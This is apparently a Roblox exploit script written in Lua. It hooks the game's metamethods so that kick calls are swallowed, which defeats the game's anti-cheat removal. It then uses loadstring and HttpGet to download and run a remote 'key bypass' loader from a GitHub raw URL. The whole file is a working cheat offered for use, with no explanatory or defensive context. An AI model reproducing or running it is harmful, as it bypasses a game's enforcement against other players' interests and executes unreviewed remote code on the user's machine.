local plr = game:GetService("Players").LocalPlayer

local old 
old = hookmetamethod(game, "__index", newcclosure(function(self, k)
    if k:lower() == "kick" then
    return wait()
    end
   return old(self, k) 
end))

loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/RiseValco/keybypasses/main/extremehub/loader.lua"))()
